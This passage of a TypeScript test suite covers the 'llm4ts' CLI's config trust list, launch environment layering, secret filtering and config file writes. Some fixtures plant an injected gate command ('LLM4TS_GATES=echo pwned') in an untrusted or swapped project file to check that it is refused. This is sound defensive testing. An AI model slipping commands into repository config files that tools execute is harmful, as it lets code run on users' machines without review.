          loaded.resolution.problems.map((problem) => problem.message),
          [
            `${trustPath}: the trust list cannot be used (not a JSON object of repository paths and hashes), so no project file is trusted; llm4ts config trust writes a new list`,
            `${projectPath} is new and not trusted, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo}`
          ]
        )
      })
    )
  }

  it.effect("a trust list that cannot be read trusts nothing and does not fail the load", () =>
    Effect.gen(function* () {
      const loaded = yield* load(
        { ...files, ...trusting({ [repo]: project }) },
        { through: (store) => failingReads(store, trustPath) }
      )
      assert.strictEqual(loaded.projectTrust, "untrusted")
      assert.deepStrictEqual(brief(loaded.resolution.problems), [
        "warning untrusted",
        "warning untrusted"
      ])
      assert.include(loaded.resolution.problems[0]?.message ?? "", "permission denied")
    })
  )

  it.effect("no project file: nothing to trust, and a broken trust list is not mentioned", () =>
    Effect.gen(function* () {
      const loaded = yield* load({ [globalPath]: "LLM4TS_REASONER=claude\n", [trustPath]: "{" })
      assert.strictEqual(loaded.projectTrust, "absent")
      assert.isUndefined(loaded.projectHash)
      assert.deepStrictEqual(loaded.resolution.problems, [])
    })
  )

  it.effect("two repositories do not share trust, even for the same content", () =>
    Effect.gen(function* () {
      const other = "/work/other"
      const held = {
        ...files,
        [projectConfigPath(other)]: project,
        ...trusting({ [repo]: project })
      }
      assert.strictEqual((yield* load(held)).projectTrust, "trusted")
      const loaded = yield* load(held, { repo: other })
      assert.strictEqual(loaded.projectTrust, "untrusted")
      assert.isFalse(loaded.resolution.settings.has("LLM4TS_GATES"))
    })
  )

  it.effect("a repository that moved is untrusted at its new path", () =>
    Effect.gen(function* () {
      const moved = "/work/moved"
      const loaded = yield* load(
        { [projectConfigPath(moved)]: project, ...trusting({ [repo]: project }) },
        { repo: moved }
      )
      assert.strictEqual(loaded.projectTrust, "untrusted")
      assert.isFalse(loaded.resolution.settings.has("LLM4TS_GATES"))
    })
  )
})

describe("prepareLaunch", () => {
  const launch = (options: {
    readonly flow: string
    readonly files?: Readonly<Record<string, string>>
    readonly base?: Environment
    readonly flags?: ReadonlyArray<FlagAssignment>
    /** `false` leaves the project file as it arrived: not trusted. */
    readonly trust?: false
  }) =>
    Effect.gen(function* () {
      const held = options.files ?? {}
      const memory = yield* makeMemoryPlainFileStore(options.trust === false ? held : trusted(held))
      return yield* prepareLaunch({
        repo,
        flow: options.flow,
        base: { HOME: home, ...options.base },
        flags: options.flags ?? [],
        files: memory.store
      })
    })

  for (const [label, store, standing] of [
    ["never trusted", {}, "is new and not trusted"],
    ["changed since it was trusted", trusting({ [repo]: "" }), "has changed since it was trusted"]
  ] as const) {
    it.effect(`refuses a project file ${label}, before any other check`, () =>
      Effect.gen(function* () {
        const error = yield* Effect.flip(
          launch({
            flow: "convert-page",
            files: { [projectPath]: "LLM4TS_GATES=echo pwned\noops\n", ...store },
            trust: false
          })
        )
        assert.strictEqual(error._tag, "ShellUsage")
        assert.strictEqual(
          error.message,
          `${projectPath} ${standing}, so llm4ts did not read it. Review and accept it: llm4ts config trust --repo ${repo}\nNothing was started.`
        )
      })
    )
  }

  it.effect("a file value reaches the child, an export wins over it, a flag over both", () =>
    Effect.gen(function* () {
      const plan = yield* launch({
        flow: "implement",
        files: {
          [globalPath]: "LLM4TS_VERBOSITY=verbose\nLLM4TS_CODER=pi\n",
          [projectPath]: "LLM4TS_JUDGE_ROUNDS=1\nLLM4TS_ISOLATED=on\nLLM4TS_PACK=from-file\n"
        },
        base: { LLM4TS_VERBOSITY: "quiet", LLM4TS_PACK: "exported", PATH: "/usr/bin" },
        flags: [set("LLM4TS_PACK", "flagged", "--pack")]
      })
      assert.deepStrictEqual(
        { ...plan.environment },
        {
          HOME: home,
          PATH: "/usr/bin",
          LLM4TS_VERBOSITY: "quiet",
          LLM4TS_CODER: "pi",
          LLM4TS_JUDGE_ROUNDS: "1",
          LLM4TS_ISOLATED: "1",
          LLM4TS_PACK: "flagged",
          LLM4TS_FLOW: "implement"
        }
      )
      assert.deepStrictEqual(plan.notices, [
        `note: LLM4TS_VERBOSITY from the environment overrides ${globalPath}:1`
      ])
    })
  )

  it.effect("a shellOnly secret never reaches a flow child", () =>
    Effect.gen(function* () {
      const plan = yield* launch({
        flow: "implement",
        base: { LLM4TS_MCP_TOKEN: "s3cret", LLM4TS_GEMINI_BRIDGE_TOKEN: "t0ken" }
      })
      assert.isFalse("LLM4TS_MCP_TOKEN" in plan.environment)
      assert.strictEqual(plan.environment.LLM4TS_GEMINI_BRIDGE_TOKEN, "t0ken")
    })
  )

  it.effect("warns about a misspelled export only when a setting is close", () =>
    Effect.gen(function* () {
      const plan = yield* launch({
        flow: "implement",
        base: {
          LLM4TS_VERBOSTY: "verbose",
          LLM4TS_MY_OWN_FLOW_KNOB: "1"
        }
      })
      assert.deepStrictEqual(plan.notices, [
        "warning: the environment: unknown setting LLM4TS_VERBOSTY; did you mean LLM4TS_VERBOSITY?"
      ])
      assert.strictEqual(plan.environment.LLM4TS_VERBOSTY, "verbose")
    })
  )

  it.effect(
    "refuses an unreadable environment value, naming it and its grammar, never a value",
    () =>
      Effect.gen(function* () {
        const error = yield* Effect.flip(
          launch({
            flow: "implement",
            base: {
              LLM4TS_JUDGE_ROUNDS: "abc",
              LLM4TS_STALL_MINUTES: "soon",
              LLM4TS_MCP_TOKEN: "s3cret",
              LLM4TS_GEMINI_BRIDGE_TOKEN: "t0ken"
            }
          })
        )
        assert.strictEqual(error._tag, "ShellUsage")
        assert.strictEqual(
          error.message,
          [
            "the environment: LLM4TS_JUDGE_ROUNDS must be a positive integer; fix or unset it",
            "the environment: LLM4TS_STALL_MINUTES must be a positive number of minutes; fix or unset it"
          ].join("\n")
        )
        for (const value of ["abc", "soon", "s3cret", "t0ken"]) {
          assert.notInclude(error.message, value)
        }
      })
  )

  it.effect("launches with the same environment value once it reads", () =>
    Effect.gen(function* () {
      const plan = yield* launch({ flow: "implement", base: { LLM4TS_JUDGE_ROUNDS: "3" } })
      assert.deepStrictEqual(plan.notices, [])
      assert.strictEqual(plan.environment.LLM4TS_JUDGE_ROUNDS, "3")
    })
  )

  for (const [label, flags, message] of [
    [
      "an unknown --set name",
      [set("LLM4TS_VERBOSTY", "verbose")],
      "--set: unknown setting LLM4TS_VERBOSTY; did you mean LLM4TS_VERBOSITY?"
    ],
    [
      "an unreadable --set value",
      [set("LLM4TS_JUDGE_ROUNDS", "one")],
      "--set: LLM4TS_JUDGE_ROUNDS must be a positive integer"
    ],
    [
      "a secret from a flag",
      [set("LLM4TS_MCP_TOKEN", "s3cret")],
      "--set: LLM4TS_MCP_TOKEN is a secret: export it in the environment"
    ],
    [
      "a setting named by a flag and by --set",
      [set("LLM4TS_PACK", "a", "--pack"), set("LLM4TS_PACK", "b")],
      "LLM4TS_PACK is set by --pack and --set; use one"
    ]
  ] as const) {
    it.effect(`refuses ${label}`, () =>
      Effect.gen(function* () {
        const error = yield* Effect.flip(launch({ flow: "implement", flags }))
        assert.strictEqual(error._tag, "ShellUsage")
        assert.strictEqual(error.message, message)
      })
    )
  }

  it.effect("refuses a malformed file line and an unreadable file value", () =>
    Effect.gen(function* () {
      const error = yield* Effect.flip(
        launch({
          flow: "implement",
          files: { [projectPath]: "oops\nLLM4TS_JUDGE_ROUNDS=one\n" }
        })
      )
      assert.strictEqual(
        error.message,
        [
          `${projectPath}:1: not a NAME=value line`,
          `${projectPath}:2: LLM4TS_JUDGE_ROUNDS must be a positive integer`
        ].join("\n")
      )
    })
  )

  it.effect("refuses a flow whose required setting no layer sets, with both ways to set it", () =>
    Effect.gen(function* () {
      const error = yield* Effect.flip(launch({ flow: "pack-fork" }))
      const doc = (name: "LLM4TS_TARGET_KIND" | "LLM4TS_FORK_AS") =>
        registryFacts.find((fact) => fact.name === name)?.doc ?? ""
      assert.strictEqual(
        error.message,
        [
          `pack-fork needs LLM4TS_TARGET_KIND: ${doc("LLM4TS_TARGET_KIND")}`,
          `  for this repository:  llm4ts config set --repo ${repo} LLM4TS_TARGET_KIND=<value>`,
          "  for this run only:    llm4ts run pack-fork --set LLM4TS_TARGET_KIND=<value>",
          `pack-fork needs LLM4TS_FORK_AS: ${doc("LLM4TS_FORK_AS")}`,
          `  for this repository:  llm4ts config set --repo ${repo} LLM4TS_FORK_AS=<value>`,
          "  for this run only:    llm4ts run pack-fork --set LLM4TS_FORK_AS=<value>"
        ].join("\n")
      )
    })
  )

  it.effect("a required setting from any layer lets the flow start", () =>
    Effect.gen(function* () {
      const plan = yield* launch({
        flow: "convert-page",
        files: { [projectPath]: "LLM4TS_LEGACY_REPO=../legacy\n" }
      })
      assert.strictEqual(plan.environment.LLM4TS_LEGACY_REPO, "/work/legacy")
      assert.strictEqual(plan.environment.LLM4TS_FLOW, "convert-page")
    })
  )
})

describe("loadConfig", () => {
  it.effect("absent files are no problem", () =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore()
      const loaded = yield* loadConfig({
        repo,
        environment: { HOME: home, LLM4TS_CODER: "pi" },
        flags: [],
        files: memory.store
      })
      assert.isUndefined(loaded.project)
      assert.isUndefined(loaded.global)
      assert.deepStrictEqual(loaded.resolution.problems, [])
      assert.deepStrictEqual([...loaded.resolution.settings.keys()], ["LLM4TS_CODER"])
    })
  )

  it.effect("reads both files, the global one from XDG_CONFIG_HOME, and layers them", () =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore(
        trusted({
          "/xdg/llm4ts/config.env":
            "LLM4TS_CODER=pi\nLLM4TS_REASONER=claude\nLLM4TS_WORKTREE_ROOT=~/trees\n",
          [projectPath]: "LLM4TS_CODER=codex\nLLM4TS_LEGACY_REPO=../legacy\noops\n"
        })
      )
      const loaded = yield* loadConfig({
        repo,
        environment: { HOME: home, XDG_CONFIG_HOME: "/xdg" },
        flags: [set("LLM4TS_REASONER", "gemini")],
        files: memory.store
      })
      const value = (name: "LLM4TS_CODER" | "LLM4TS_REASONER" | "LLM4TS_LEGACY_REPO") =>
        loaded.resolution.settings.get(name)?.raw
      assert.strictEqual(value("LLM4TS_CODER"), "codex")
      assert.strictEqual(value("LLM4TS_REASONER"), "gemini")
      assert.strictEqual(value("LLM4TS_LEGACY_REPO"), "/work/legacy")
      assert.strictEqual(
        loaded.resolution.settings.get("LLM4TS_WORKTREE_ROOT")?.raw,
        "/home/u/trees"
      )
      assert.strictEqual(loaded.global?.path, "/xdg/llm4ts/config.env")
      assert.deepStrictEqual(
        loaded.resolution.problems.map((problem) => problem.message),
        [`${projectPath}:3: not a NAME=value line`]
      )
    })
  )

  it.effect("an unreadable file is a typed error naming the path", () =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore()
      const error = yield* Effect.flip(
        loadConfig({
          repo,
          environment: { HOME: home },
          flags: [],
          files: failingReads(memory.store, projectPath)
        })
      )
      assert.strictEqual(error._tag, "ConfigFileError")
      assert.strictEqual(error.path, projectPath)
      assert.strictEqual(error.message, `cannot read ${projectPath}: permission denied`)
    })
  )
})

describe("writeConfig", () => {
  it.effect("the first write of the project file leaves .llm4ts/.gitignore", () =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore()
      const written = yield* writeConfig({
        files: memory.store,
        path: projectPath,
        changes: [{ name: "LLM4TS_GATES", value: "pnpm test" }]
      })
      assert.strictEqual(written, 'LLM4TS_GATES="pnpm test"\n')
      assert.deepStrictEqual(yield* memory.files, {
        "/work/app/.llm4ts/.gitignore": "*\n",
        [projectPath]: 'LLM4TS_GATES="pnpm test"\n'
      })
    })
  )

  it.effect("keeps an ignore file the repository already has, and the file's other lines", () =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore({
        "/work/app/.llm4ts/.gitignore": "*\n!flows/\n",
        [projectPath]: "# mine\nLLM4TS_CODER=pi\n"
      })
      yield* writeConfig({
        files: memory.store,
        path: projectPath,
        changes: [
          { name: "LLM4TS_CODER", value: undefined },
          { name: "LLM4TS_PACK", value: "soap-ace" }
        ]
      })
      assert.deepStrictEqual(yield* memory.files, {
        "/work/app/.llm4ts/.gitignore": "*\n!flows/\n",
        [projectPath]: "# mine\nLLM4TS_PACK=soap-ace\n"
      })
    })
  )

  it.effect("the global file gets no ignore file beside it", () =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore()
      yield* writeConfig({
        files: memory.store,
        path: globalPath,
        changes: [{ name: "LLM4TS_CODER", value: "pi" }]
      })
      assert.deepStrictEqual(yield* memory.files, { [globalPath]: "LLM4TS_CODER=pi\n" })
    })
  )

  it.effect("setting the current value writes nothing", () =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore({ [globalPath]: "LLM4TS_CODER=pi\n" })
      const changed = yield* writeConfig({
        files: memory.store,
        path: globalPath,
        changes: [{ name: "LLM4TS_CODER", value: "pi" }]
      })
      assert.isUndefined(changed)
      const absent = yield* writeConfig({
        files: memory.store,
        path: projectPath,
        changes: [{ name: "LLM4TS_CODER", value: undefined }]
      })
      assert.isUndefined(absent)
      assert.deepStrictEqual(yield* memory.files, { [globalPath]: "LLM4TS_CODER=pi\n" })
    })
  )

  it.effect("a value with no spelling fails and leaves the file alone", () =>
    Effect.gen(function* () {
      const memory = yield* makeMemoryPlainFileStore({ [projectPath]: "LLM4TS_CODER=pi\n" })
      const error = yield* Effect.flip(
        writeConfig({
          files: memory.store,
          path: projectPath,
          changes: [{ name: "LLM4TS_GATES", value: `echo "it's"` }]
        })
      )
      assert.strictEqual(error.message, `LLM4TS_GATES: a value cannot hold both ' and "`)
      assert.deepStrictEqual(yield* memory.files, { [projectPath]: "LLM4TS_CODER=pi\n" })
    })
  )

  it.effect("a file that is not the one that was judged is left alone", () =>
    Effect.gen(function* () {
      const judged = "LLM4TS_CODER=pi\n"
      const swapped = "LLM4TS_GATES=echo pwned\n"
      const memory = yield* makeMemoryPlainFileStore({ [projectPath]: swapped })
      const write = (hash: string | undefined) =>
        writeConfig({
          files: memory.store,
          path: projectPath,
          changes: [{ name: "LLM4TS_PACK", value: "soap-ace" }],
          expect: { hash }
        })
      for (const hash of [contentHash(judged), undefined]) {
        const error = yield* Effect.flip(write(hash))
        assert.strictEqual(
          error.message,
          `${projectPath} changed while llm4ts was working; nothing was written`
        )
      }
      assert.deepStrictEqual(yield* memory.files, { [projectPath]: swapped })
      assert.strictEqual(yield* write(contentHash(swapped)), `${swapped}LLM4TS_PACK=soap-ace\n`)
    })
  )
})
